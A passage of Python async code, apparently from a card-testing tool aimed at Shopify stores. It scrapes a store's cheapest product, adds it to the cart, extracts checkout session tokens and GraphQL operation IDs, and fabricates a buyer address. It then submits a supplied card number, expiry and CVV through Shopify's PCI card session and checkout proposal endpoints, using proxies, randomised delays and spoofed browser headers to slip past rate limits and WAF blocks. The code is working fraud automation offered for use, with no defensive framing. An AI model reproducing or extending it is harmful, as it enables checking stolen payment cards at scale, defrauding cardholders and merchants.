            'accept': 'application/json',  # <--- JSON ke liye, text/html nahi
            'accept-language': 'en-US,en;q=0.9',
            'referer': store_url,          # <--- Yeh sahi hai, waise hi rakh
            'sec-fetch-dest': 'empty',     # <--- AJAX ke liye
            'sec-fetch-mode': 'cors',      # <--- AJAX ke liy
            'sec-fetch-site': 'same-origin', # <--- same site se call ho rahi
            'user-agent': ua,
        }
                            
        for attempt in range(max_retries):
            try: 
                await asyncio.sleep(random.uniform(0.4, 0.9))
                async with session.get(
                    f"{store_url}/products.json?limit=250",
                    headers=p_headers,                       
                    proxy=proxy_url,
                    timeout=timeout_settings
                ) as r:

                    if r.status == 200:
                        data = await r.json()                
                        if isinstance(data, dict) and data.get("products"):
                            products = data
                            json_ok = True
                            break

                    elif r.status in [403, 429]:
                        last_error = f"WAF Blocked ({r.status})"
                        break
                    else:
                        last_error = f"HTTP {r.status}"
                        if attempt < max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                        else:
                            break
                        
            except Exception as e:
                last_error = f"Request Error: {str(e)}"
                if attempt < max_retries - 1:
                    await asyncio.sleep(1.5)
                    continue
                else:
                    break

        if not json_ok:
            return {
                "status": "ERROR",
                "message": last_error,
                "time": time.time() - start_time,
                "amount": "0",
                "currency": "USD",
                "gateway": "Normal",
            }

        non_shippable_variants = []
        shippable_variants = []

        for product in products.get("products", []):
            product_title = product.get("title")
            for variant in product.get("variants", []):
                try:
                    rs = variant.get("requires_shipping", product.get("requires_shipping", True))
                    compare_price = variant.get("compare_at_price")
                    regular_price = variant.get("price")
                    
                    if regular_price and float(str(regular_price).replace(",", "") or "0") > 0:
                        raw_price = regular_price
                    elif compare_price:
                        raw_price = compare_price
                    else:
                        raw_price = "99999"

                    rp = re.sub(r"[^\d\.]", "", str(raw_price))
                    price = float(rp) if rp else 9999.0

                    if price < 0.1 or price > 200000:
                        continue
                    if not variant.get("available", True):
                        continue                        
                    
                    v = variant.copy()
                    v["product_title"] = product_title
                    v["_price"] = price
                    v["product_handle"] = product.get("handle")  
                    if not rs:
                        non_shippable_variants.append(v)
                    else:
                        shippable_variants.append(v)
                except Exception:
                    continue

        non_shippable_variants.sort(key=lambda x: x["_price"])
        shippable_variants.sort(key=lambda x: x["_price"])
        
        cheap_digital = [v for v in non_shippable_variants if v["_price"] < 4.0]

        if cheap_digital:
            cheapest_variant = cheap_digital[0]
            is_shippable = False
        else:
            all_variants = non_shippable_variants + shippable_variants
            all_variants.sort(key=lambda x: x["_price"])
            cheapest_variant = all_variants[0] if all_variants else None
            is_shippable = (
                cheapest_variant.get("requires_shipping", True)
                if cheapest_variant
                else True
            )

        if not cheapest_variant:
            total_products = len(products.get("products", []))
            total_variants = sum(
                len(p.get("variants", [])) for p in products.get("products", [])
            )

            if total_products > 0:
                error_msg = f"All {total_variants} out of stock"
            else:
                error_msg = "No products found in store"


            return {
                "status": "ERROR",
                "message": error_msg,
                "time": time.time() - start_time,
                "amount": "0",
                "currency": "USD",
                "gateway": "Normal",
            }
        
        product_handle = cheapest_variant.get("product_handle")
        
        if not product_handle:

            return {
                "status": "ERROR",
                "message": "Product handle missing",
                "time": time.time() - start_time,
                "amount": cheapest_variant["price"],
                "currency": "USD",
                "gateway": "Normal",
            }
            
        safe_handle = urllib.parse.quote(product_handle)
        product_page_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': store_url,           # <-- Homepage se aa rahe ho
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',   # <-- Page hai
            'sec-fetch-mode': 'navigate',   # <-- Navigation hai
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',         # <-- User ne click kiya
            'user-agent': ua,
        }       
        try:
            await asyncio.sleep(random.uniform(0.3, 0.6))
            async with session.get(
                f"{store_url}/products/{product_handle}",
                proxy=proxy_url,
                timeout=timeout_settings,
                headers = product_page_headers
            ) as prod_resp:
                await prod_resp.read()
        except Exception as e:

            return {
                "status": "ERROR",
                "message": str(e),
                "time": time.time() - start_time,
                "amount": cheapest_variant["price"],
                "currency": "USD",
                "gateway": "Normal",
            }
        
        cart_headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            'accept-language': 'en-US,en;q=0.9',
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": store_url,
            "referer": f"{store_url}/products/{safe_handle}",
            "x-requested-with": "XMLHttpRequest",
            "sec-fetch-dest": "empty",      # <-- AJAX
            "sec-fetch-mode": "cors",       # <-- AJAX
            "sec-fetch-site": "same-origin",
            "user-agent": ua,
        }
        
        cart_payload = {
            "id": cheapest_variant["id"],
            "quantity": 1
        }
        
        cart_ok = False
        add_cart_error = ""

        for attempt in range(max_retries):                
            try: 
                await asyncio.sleep(random.uniform(0.3, 0.6))
                async with session.post(
                    f"{store_url}/cart/add.js",
                    data=cart_payload,   
                    headers=cart_headers,             
                    proxy=proxy_url,
                    timeout=timeout_settings
                ) as add_response:
                    
                    if add_response.status in [200, 201, 303]:
                        cart_ok = True
                        break
                    elif add_response.status == 402:
                        add_cart_error = str(add_response.status)
                        if attempt < max_retries - 1:
                            continue  
                        else:
                            break
                    elif add_response.status in [403, 401, 429, 422]: 
                        add_cart_error = str(add_response.status)
                        break
                    elif add_response.status in [500, 502, 503, 504]:
                        add_cart_error = str(add_response.status)
                        if attempt < max_retries - 1:
                            continue
                        else:
                            break
                        
            except Exception as e:
                add_cart_error = str(e)
                if attempt < max_retries - 1:
                    continue
                else:
                    break

        if not cart_ok:

            return {
                "status": "ERROR",
                "message": add_cart_error,
                "time": time.time() - start_time,

                "amount": cheapest_variant["price"],
                "currency": "USD",
                "gateway": "Normal",
            }
        cart_fetch_headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'referer': f"{store_url}/products/{safe_handle}",
            'user-agent': ua,
            'x-requested-with': 'XMLHttpRequest',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }                
        try:
            await asyncio.sleep(random.uniform(0.4, 0.8))               
            async with session.get(
                f"{store_url}/cart.js",
                proxy=proxy_url,
                timeout=timeout_settings,
                headers=cart_fetch_headers,
            ) as cart_response:
                await cart_response.read()
        except Exception as e:

            return {
                "status": "ERROR",
                "message": str(e),
                "time": time.time() - start_time,

                "amount": cheapest_variant["price"],
                "currency": "USD",
                "gateway": "Normal",
            }
            
        Checkout_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': store_url,
            'referer': f'{store_url}/cart',
            'sec-fetch-dest': 'document',      # <-- Zaroori
            'sec-fetch-mode': 'navigate',      # <-- Zaroori
            'sec-fetch-site': 'same-origin',   # <-- Zaroori
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
        }
        
        data = {
            'checkout': '',
        }

        checkout_html = None
        checkout_url = None
        checkout_ok = False
        checkout_error = ""

        for attempt in range(max_retries):
            try:
                await asyncio.sleep(random.uniform(0.3, 0.6))
                async with session.post(
                    f"{store_url}/cart",
                    data=data,
                    headers=Checkout_headers,                               
                    allow_redirects=True,
                    proxy=proxy_url,
                    timeout=timeout_settings
                ) as checkout_response:

                    if checkout_response.status in [200, 302, 303]:
                        checkout_url = str(checkout_response.url)
                        if not checkout_url or "checkout" not in checkout_url.lower():
                            checkout_error = "Invalid checkout URL received"
                            break
                            
                        checkout_html = await checkout_response.text()
                        checkout_base_domain = checkout_url.split('/checkouts/')[0]
                        checkout_ok = True
                        break
                    elif checkout_response.status == 402:
                        checkout_error = str(checkout_response.status)
                        if attempt < max_retries - 1:
                            continue
                        else:
                            break
                    elif checkout_response.status in [403, 429]:
                        checkout_error = str(checkout_response.status)
                        break
                    elif checkout_response.status in [500, 502, 503, 504]:
                        checkout_error = str(checkout_response.status)
                        if attempt < max_retries - 1:
                            continue
                        else:
                            break
                    else:
                        checkout_error = str(checkout_response.status)
                        break

            except Exception as e:
                checkout_error = str(e)
                if attempt < max_retries - 1:
                    continue
                else:
                    break

        if not checkout_ok:

            return {
                "status": "ERROR",
                "message": checkout_error,
                "time": time.time() - start_time,

                "amount": cheapest_variant["price"],
                "currency": "USD",
                "gateway": "Normal",
            }

        if not checkout_html:

            return {
                "status": "ERROR",
                "message": "Checkout HTML not available",
                "time": time.time() - start_time,

                "amount": cheapest_variant["price"],
                "currency": "USD",
                "gateway": "Normal",
            }

        try:
            serialized_source_token = find_between(
                checkout_html, 'name="serialized-sourceToken" content="&quot;', '&quot;"'
            )
            serialized_source_type = find_between(
                checkout_html, 'name="serialized-sourceType" content="&quot;', '&quot;"'
            )
            x_checkout_one_session_token = (
                find_between(
                    checkout_html, 'name="serialized-sessionToken" content="&quot;', '&quot;"'
                ))               

            web_build_id = find_between(
                checkout_html, "commitSha&quot;:&quot;", "&quot;"
            ) or find_between(checkout_html, '"commitSha":"', '"')

            checkout_session_id = find_between(
                checkout_html, "checkoutSessionIdentifier&quot;:&quot;", "&quot;"
            )

            cardsink_signature = find_between(
                checkout_html,
                "checkoutCardsinkCallerIdentificationSignature&quot;:&quot;",
                "&quot;",
            )

            queue_token = find_between(checkout_html, "queueToken&quot;:&quot;", "&quot;")
            stable_id = find_between(checkout_html, "stableId&quot;:&quot;", "&quot;")
            currency_code = find_between(checkout_html, "currencyCode&quot;:&quot;", "&quot;")

            merch_id = find_between(
                checkout_html,
                "__typename&quot;:&quot;ProductVariantMerchandise&quot;,&quot;id&quot;:&quot;",
                "&quot;",
            )
            
            pci_build_hash = find_between(checkout_html, 'checkout.pci.shopifyinc.com/build/', '/card_fields.js')
            
            variant_id = (
                find_between(checkout_html, "variantId&quot;:&quot;", "&quot;")
                or find_between(checkout_html, '"variantId":"', '"')
                or str(cheapest_variant.get("id", ""))
            )
            
        except Exception as e:

            return {
                "status": "ERROR",
                "message": f"Token extraction exception: {type(e).__name__} - {str(e)}",
                "time": time.time() - start_time,

                "amount": cheapest_variant["price"],
                "currency": "USD",
                "gateway": "Normal",
            }

        missing_tokens = []
        if not stable_id:
            missing_tokens.append("stable_id")
        if not merch_id:
            missing_tokens.append("merch_id")
        if not variant_id:
            missing_tokens.append("variant_id")
        if not x_checkout_one_session_token:
            missing_tokens.append("x_checkout_one_session_token")
        if not queue_token:
            missing_tokens.append("queue_token")
        if not serialized_source_token:
            missing_tokens.append("serialized_source_token")
        if not serialized_source_type:
            missing_tokens.append("serialized_source_type")

        if missing_tokens:

            return {
                "status": "ERROR",
                "message": "Token extraction Failed",
                "time": time.time() - start_time,

                "amount": cheapest_variant["price"],
                "currency": "USD",
                "gateway": "Normal",
            }

            
        match = re.search(r'/cdn/shopifycloud/checkout-web/assets/c1/actions\.[A-Za-z0-9_-]+\.js', checkout_html)
        if match:
            js_url = f"{checkout_base_domain}{match.group(0)}"
        else:
            js_url = f"{checkout_base_domain}/cdn/shopifycloud/checkout-web/assets/c1/actions.CEcLuZJR.js"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'origin': store_url,            
            "user-agent": ua,
        }

        try:
            async with session.get(
                js_url, 
                headers=headers, 
                proxy=proxy_url, 
                timeout=timeout_settings
            ) as ids_response:
                js_body = await ids_response.text()
        except Exception as e:

            return {
                "status": "ERROR",
                "message": f"JS fetch error: {str(e)}",
                "time": time.time() - start_time,

                "amount": cheapest_variant["price"],
                "currency": currency_code,
                "gateway": "Normal",
            }

        proposal_pattern = r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"'
        submit_pattern = r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"'
        poll_pattern = r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"'
        poll_match = re.search(poll_pattern, js_body)
        poll_id = poll_match.group(1) if poll_match else None

        proposal_match = re.search(proposal_pattern, js_body)
        submit_match = re.search(submit_pattern, js_body)

        proposal_id = proposal_match.group(1) if proposal_match else None
        submit_id = submit_match.group(1) if submit_match else None
        if not poll_id:
            poll_id = "c747e4fdabadb5dd59f44a0d804ecbc03433cf0c46d82145484be631b5b738c5"        
                
        try:
            coverage = analyze_geo_coverage(geo_data)
            address = generate_smart_address(base_domain, currency_code, geo_data)
        except Exception as e:

            return {
                "status": "ERROR",
                "message": f"Address generation error: {type(e).__name__} - {str(e)}",
                "time": time.time() - start_time,

                "amount": cheapest_variant["price"],
                "currency": currency_code,
                "gateway": "Normal",
            }
        
        session_url = f'https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html'
        headers_iframe = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'referer': checkout_url,
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            "user-agent": ua,            
        }
        
        params = {
            'identifier': '',
            'locationURL': "" ,
        }
        
        try:                
            async with session.get(
                session_url, 
                headers=headers_iframe, 
                params=params, 
                proxy=proxy_url, 
                timeout=timeout_settings
            ) as session_resp:
                await session_resp.read()
        except Exception:
            pass


        Pci_url = 'https://checkout.pci.shopifyinc.com/sessions'
        headers_pci = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',           
            'referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html?identifier=&locationURL=',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-identification-signature': cardsink_signature,
            "user-agent": ua,
            
        }
        
        json_data_pci = {
            "credit_card": {
                "number": card_number,
                "month": int(card_month),
                "year": int(card_year),
                "verification_value": card_cvv,
                "name": f"{address['first_name']} {address['last_name']}",
            },
            "payment_session_scope": base_domain,
        }
        
        sessionid = None
        last_error = None
        pci_ok = False

        for attempt in range(max_retries):
            try:
                async with session.post(
                    Pci_url,
                    headers=headers_pci,
                    json=json_data_pci,
                    proxy=proxy_url,
                    timeout=timeout_settings
                ) as response:
                    
                    response_text = await response.text()

                    if response.status == 200:
                        pci_ok = True
                        break
                    elif response.status == 402:
                        last_error = str(response.status)
                        if attempt < max_retries - 1:
                            continue
                        else:
                            break
                    elif response.status in [403, 429]:
                        last_error = str(response.status)
                        break
                    elif response.status in [500, 502, 503, 504]:
                        last_error = str(response.status)
                        if attempt < max_retries - 1:
                            continue
                        else:
                            break
                    else:
                        last_error = str(response.status)
                        break
                        
            except Exception as e:
                last_error = str(e)
                if attempt < max_retries - 1:
                    continue
                else:
                    break

        if pci_ok:
            try:
                session_data = json.loads(response_text)
                if "id" in session_data:
                    sessionid = session_data["id"]
                else:
                    last_error = "no id in response"
            except Exception as e:
                last_error = str(e)

        if not sessionid:

            return {
                "status": "ERROR",
                "message": last_error,
                "time": time.time() - start_time,

                "amount": final_amount if "final_amount" in locals() else "0",
                "currency": currency_code if "currency_code" in locals() else "USD",
                "gateway": gateway if "gateway" in locals() else "Normal"
            }

        
        
        credit_card_bin = card_number.replace(" ", "").replace("-", "")[:6]
        attempt_token = f"{serialized_source_token}-{uuid.uuid4().hex[:8]}"
        url = f"{checkout_base_domain}/checkouts/internal/graphql/persisted"

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': store_url,            
            'referer': checkout_url,
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{serialized_source_token}", type="{serialized_source_type}"',
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build_id,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': serialized_source_token,
            "user-agent": ua,
            
        }

        
        params = {
            'operationName': 'Proposal',
        }
        json_data = {
            "variables": {
                "sessionInput": {
                    "sessionToken": x_checkout_one_session_token,
                },
                "queueToken": queue_token,
                "discounts": {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True,
                },
                "delivery": build_delivery_terms(
                    is_shippable=is_shippable,
                    address=address,
                    stable_id=stable_id,
                    variant_price=cheapest_variant["price"],
                    currency_code=currency_code,
                ),
                "deliveryExpectations": {
                    "deliveryExpectationLines": [],
                },
                "merchandise": {
                    "merchandiseLines": [
                        {
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": merch_id,
                                    "variantId": variant_id,
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                },
                            },
                            "quantity": {
                                "items": {
                                    "value": 1,
                                },
                            },
                            "expectedTotalPrice": {
                                "value": {
                                    "amount": cheapest_variant["price"],
                                    "currencyCode": currency_code,
                                },
                            },
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        },
                    ],
                },
                "memberships": {
                    "memberships": [],
                },
                "payment": {
                    "totalAmount": {
                        "any": True,
                    },
                    "paymentLines": [],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": address["street"],
                            "address2": address["street"],
                            "city": address["city"],
                            "countryCode": address["country"],
                            "postalCode": address["postal_code"],
                            "firstName": address["first_name"],
                            "lastName": address["last_name"],
                            "zoneCode": address["zoneCode"],
                            "phone": address["phone"],
                        },
                    },
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": currency_code,
                        "countryCode": address["country"],
                    },
                    "email": address["email"],
                    "emailChanged": False,
                    "phoneCountryCode": address["country"],
                    "marketingConsent": [
                        {
                            "email": {
                                "consentState": "DECLINED",
                                "value": address["email"]
                            }
                        }
                    ],
                    "shopPayOptInPhone": {
                        "number": address["phone"],
                        "countryCode": address["country"],
                    },
                    "rememberMe": False,
                },
                "tip": {
                    "tipLines": [],
                },
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": None,
                    "proposedTotalIncludedAmount": {
                        "value": {
                            "amount": "0",
                            "currencyCode": currency_code,
                        },
                    },
                    "proposedExemptions": [],
                },
                "note": {
                    "message": None,
                    "customAttributes": [],
                },
                "localizationExtension": {
                    "fields": [],
                },
                "shopPayArtifact": {
                    "optIn": {
                        "vaultEmail": "",
                        "vaultPhone": address["phone"],
                        "optInSource": "REMEMBER_ME"
                    }                
                },
                
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": [],
                },
                "optionalDuties": {
                    "buyerRefusesDuties": False,
                },
                "cartMetafields": [],
            },
            "operationName": "Proposal",
            'id': proposal_id,
        }
        new_queue_token = None
        seller_handle = None
        merch_amount = None
        shipping_amount = None
        final_amount = None
        tax_amount = None
        payment_method_identifier = None
        gateway = "Normal"
        taxes_config = {
            "proposedTotalAmount": None,
            "proposedTotalIncludedAmount": None,
        }
        
        proposal_ok = False
        proposal_error = ""
        proposal_data = {}

        for attempt in range(max_retries):                
            try:
                async with session.post(
                    url,
                    headers=headers,
                    params=params,
                    json=json_data,  
                    proxy=proxy_url,
                    timeout=timeout_settings
                ) as response:

                    if response.status in [200, 201, 202]:
                        proposal_response_text = await response.text()
                        proposal_data = json.loads(proposal_response_text)
                        
                        if not proposal_data or "data" not in proposal_data:
                            proposal_error = "Null response from proposal or missing data"
                            break
                            
                        proposal_ok = True
                        break
                    elif response.status == 402:
                        proposal_error = str(response.status)
                        if attempt < max_retries - 1:
                            await asyncio.sleep(0.3)
                            continue  
                        else:
                            break
                    elif response.status in [403, 429]:
                        proposal_error = str(response.status)
                        break
                    elif response.status in [500, 502, 503, 504]:
                        proposal_error = str(response.status)
                        if attempt < max_retries - 1:
                            await asyncio.sleep(0.3)
                            continue
                        else:
                            break
                    else:
                        proposal_error = str(response.status)
                        break

            except Exception as e:
                proposal_error = str(e)
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.3)
                    continue
                else:
                    break

        if not proposal_ok:

            return {
                "status": "ERROR",
                "message": proposal_error,
                "time": time.time() - start_time,
                "amount": cheapest_variant["price"],
                "currency": currency_code,
                "gateway": gateway,
            }

        try:
            negotiate_data = (
                proposal_data.get("data", {})
                .get("session", {})
                .get("negotiate", {})
            )
            if not negotiate_data:
                return {
                    "status": "ERROR",
                    "message": "No negotiate data in proposal response",
                    "time": time.time() - start_time,
                    "amount": cheapest_variant["price"],
                    "currency": currency_code,
                    "gateway": gateway,
                }

            result = negotiate_data.get("result", {})
            new_queue_token = result.get("queueToken")

            if not new_queue_token:
                return {
                    "status": "ERROR",
                    "message": "No queue token in response",
                    "time": time.time() - start_time,
                    "amount": cheapest_variant["price"],
                    "currency": currency_code,
                    "gateway": gateway,
                }
        except Exception as e:

            return {
                "status": "ERROR",
                "message": str(e),
                "time": time.time() - start_time,
                "amount": cheapest_variant["price"],
                "currency": currency_code,
                "gateway": gateway,
            }

        max_poll_attempts = 10
        seller_proposal = None
        
        for poll_attempt in range(max_poll_attempts):
            poll_ok = False
            poll_data = {}
            poll_error = ""
            
            for attempt in range(max_retries):
                try:
                    async with session.post(
                        url,
                        headers=headers,
                        params=params,
                        json=json_data,  
                        proxy=proxy_url,
                        timeout=timeout_settings
                    ) as response:
                        
                        if response.status in [200, 201, 202]:
                            poll_response_text = await response.text()
                            poll_data = json.loads(poll_response_text)
                            
                            if "errors" in poll_data and isinstance(poll_data["errors"], list) and len(poll_data["errors"]) > 0:
                                error_msg = poll_data["errors"][0].get("message", "Unknown Error")
                                extensions = poll_data["errors"][0].get("extensions", {})
                                error_code = extensions.get("code", "")
                                
                                poll_error = f"{error_code}: {error_msg}" if error_code else error_msg
                                poll_ok = False
                                break 
                            
                            poll_ok = True
                            break

                        elif response.status == 402:
                            poll_error = str(response.status)
                            if attempt < max_retries - 1:
                                await asyncio.sleep(0.3)
                                continue  
                            else:
                                break
                        elif response.status in [403, 429]:
                            poll_error = str(response.status)
                            break
                        elif response.status in [500, 502, 503, 504]:
                            poll_error = str(response.status)
                            if attempt < max_retries - 1:
                                await asyncio.sleep(0.3)
                                continue
                            else:
                                break
                        else:
                            poll_error = str(response.status)
                            break
                except Exception as e:
                    poll_error = str(e)
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.3)
                        continue
                    else:
                        break

            if not poll_ok and poll_error:
                return {
                    "status": "ERROR",
                    "message": poll_error,
                    "time": time.time() - start_time,
                    "amount": cheapest_variant["price"],
                    "currency": currency_code,
                    "gateway": gateway if "gateway" in locals() else "Normal"
                }

            try:
                if not poll_ok or not poll_data or "data" not in poll_data:
                    await asyncio.sleep(0.3)
                    continue

                negotiate_data = (
                    poll_data["data"].get("session", {}).get("negotiate", {})
                )
                if not negotiate_data:
                    await asyncio.sleep(0.3)
                    continue

                result = negotiate_data.get("result", {})
                seller_proposal = result.get("sellerProposal")

                if not seller_proposal or not isinstance(seller_proposal, dict):
                    await asyncio.sleep(0.3)
                    continue


            except Exception:
                await asyncio.sleep(0.3)
                continue
            
            try:
                delivery_expectations = (
                    seller_proposal.get("deliveryExpectations", {})
                    if isinstance(seller_proposal, dict)
                    else {}
                )
                delivery = (
                    seller_proposal.get("delivery", {})
                    if isinstance(seller_proposal, dict)
                    else {}
                )
                payment = (
                    seller_proposal.get("payment", {})
                    if isinstance(seller_proposal, dict)
                    else {}
                )

                delivery_expectations_ready = (
                    delivery_expectations.get("__typename") != "PendingTerms"
                    if isinstance(delivery_expectations, dict)
                    else False
                )
                delivery_ready = (
                    delivery.get("__typename") != "PendingTerms"
                    if isinstance(delivery, dict)
                    else False
                )
                payment_ready = (
                    payment.get("__typename") != "PendingTerms"
                    if isinstance(payment, dict)
                    else False
                )

                if delivery_expectations_ready and delivery_ready and payment_ready:
                    break
                else:
                    poll_delay = (
                        delivery_expectations.get("pollDelay")
                        or delivery.get("pollDelay")
                        or payment.get("pollDelay")
                        or 1000
                    )
                    await asyncio.sleep(max(0.3, poll_delay / 1000))
            except Exception:
                await asyncio.sleep(0.3)
                continue
        else:

            return {
                "status": "ERROR",
                "message": "Timeout - Terms never completed",
                "time": time.time() - start_time,
                "amount": cheapest_variant["price"],
                "currency": currency_code,
                "gateway": gateway if "gateway" in locals() else "Normal"
            }


        if seller_proposal:
            seller_handle = None

            try:
                seller_delivery = seller_proposal.get("delivery", {})
                seller_lines = seller_delivery.get("deliveryLines", [])

                for line in seller_lines:
                    selected = line.get("selectedDeliveryStrategy", {})
                    handle = selected.get("handle")
                    if handle:
                        seller_handle = handle
                        break

                if not seller_handle:
                    buyer_proposal = result.get("buyerProposal", {})
                    buyer_delivery = buyer_proposal.get("delivery", {})
                    buyer_lines = buyer_delivery.get("deliveryLines", [])

                    for line in buyer_lines:
                        selected = line.get("selectedDeliveryStrategy", {})
                        handle = selected.get("handle")
                        if handle:
                            seller_handle = handle
                            break

            except Exception:
                seller_handle = None
                
            try:
                merchandise = seller_proposal.get("merchandise", {})
                merch_lines = merchandise.get("merchandiseLines", [])
                if merch_lines and len(merch_lines) > 0:
                    total_amount_obj = (
                        merch_lines[0].get("totalAmount", {}).get("value", {})
                    )
                    merch_amount = total_amount_obj.get("amount")
                    currency_code = total_amount_obj.get(
                        "currencyCode", currency_code if "currency_code" in locals() else "USD"
                    )
                else:
                    merch_amount = None
            except Exception:
                merch_amount = None
                
            merch_amount = float(merch_amount) if merch_amount is not None else 0.0

            shipping_amount = None

            try:
                delivery = seller_proposal.get("delivery", {})
                delivery_macros = delivery.get("deliveryMacros", [])

                for macro in delivery_macros:
                    amt = (
                        macro.get("amount", {})
                        .get("value", {})
                        .get("amount")
                    )
                    if amt is not None:
                        shipping_amount = amt
                        break
            except Exception:
                pass

            if shipping_amount is None:
                try:
                    buyer_delivery = result.get("buyerProposal", {}).get("delivery", {})
                    buyer_lines = buyer_delivery.get("deliveryLines", [])

                    for line in buyer_lines:
                        amt = (
                            line.get("totalAmount", {})
                            .get("value", {})
                            .get("amount")
                        )
                        if amt is not None:
                            shipping_amount = amt
                            break
                except Exception:
                    pass

            if shipping_amount is None:
                shipping_amount = 0.0

            try:
                final_amount = (
                    seller_proposal.get("runningTotal", {})
                    .get("value", {})
                    .get("amount")
                )
                if not final_amount:
                    final_amount = (
                        seller_proposal.get("total", {})
                        .get("value", {})
                        .get("amount", "0.0")
                    )
            except Exception:
                final_amount = None
                
            final_amount = float(final_amount) if final_amount is not None else 0.0

            def safe_get_amount(data, field):
                try:
                    if not data or not isinstance(data, dict):
                        return None
                    value = data.get(field)
                    if isinstance(value, dict):
                        val_data = value.get("value")
                        if isinstance(val_data, dict):
                            return val_data.get("amount")
                except:
                    pass
                return None

            def safe_get_currency(data, field, default_currency):
                try:
                    if not data or not isinstance(data, dict):
                        return default_currency
                    value = data.get(field)
                    if isinstance(value, dict):
                        val_data = value.get("value")
                        if isinstance(val_data, dict):
                            curr = val_data.get("currencyCode")
                            return curr if curr else default_currency
                except:
                    pass
                return default_currency

            try:
                tax_data = seller_proposal.get("tax", {}) if seller_proposal else {}
                allocations = tax_data.get("allocations", []) if tax_data else []
                exemptions = tax_data.get("exemptions", []) if tax_data else []
            except Exception:
                tax_data = {}
                allocations = []
                exemptions = []

            tax_candidates = [
                {
                    "field": "proposedTotalAmount",
                    "amount": safe_get_amount(tax_data, "proposedTotalAmount"),
                    "currency": safe_get_currency(
                        tax_data, "proposedTotalAmount", currency_code if "currency_code" in locals() else "USD"
                    ),
                    "structure": "proposed_standard",
                    "priority": 1,
                },
                {
                    "field": "proposedTotalIncludedAmount",
                    "amount": safe_get_amount(
                        tax_data, "proposedTotalIncludedAmount"
                    ),
                    "currency": safe_get_currency(
                        tax_data, "proposedTotalIncludedAmount", currency_code if "currency_code" in locals() else "USD"
                    ),
                    "structure": "proposed_included",
                    "priority": 2,
                },
                {
                    "field": "totalTaxAndDutyAmount",
                    "amount": safe_get_amount(tax_data, "totalTaxAndDutyAmount"),
                    "currency": safe_get_currency(
                        tax_data, "totalTaxAndDutyAmount", currency_code if "currency_code" in locals() else "USD"
                    ),
                    "structure": "combined",
                    "priority": 3,
                },
                {
                    "field": "totalTaxAmount",
                    "amount": safe_get_amount(tax_data, "totalTaxAmount"),
                    "currency": safe_get_currency(
                        tax_data, "totalTaxAmount", currency_code if "currency_code" in locals() else "USD"
                    ),
                    "structure": "standard",
                    "priority": 4,
                },
                {
                    "field": "totalAmountIncludedInTarget",
                    "amount": safe_get_amount(
                        tax_data, "totalAmountIncludedInTarget"
                    ),
                    "currency": safe_get_currency(
                        tax_data, "totalAmountIncludedInTarget", currency_code if "currency_code" in locals() else "USD"
                    ),
                    "structure": "included",
                    "priority": 5,
                },
            ]

            selected_tax = None
            for candidate in tax_candidates:

                if candidate["amount"] is not None:
                    try:
                        amt_float = float(candidate["amount"])
                        if amt_float >= 0:
                            selected_tax = candidate
                            break
                    except (ValueError, TypeError):
                        continue

            if selected_tax:
                tax_amount = selected_tax["amount"]
                tax_currency = selected_tax["currency"]
                tax_structure = selected_tax["structure"]
            else:
                tax_amount = "0.0"
                tax_currency = currency_code if "currency_code" in locals() else "USD"
                tax_structure = "combined"

            if tax_structure in ["included", "proposed_included"]:
                taxes_config = {
                    "proposedAllocations": allocations if allocations else None,
                    "proposedTotalAmount": None,
                    "proposedTotalIncludedAmount": {
                        "value": {
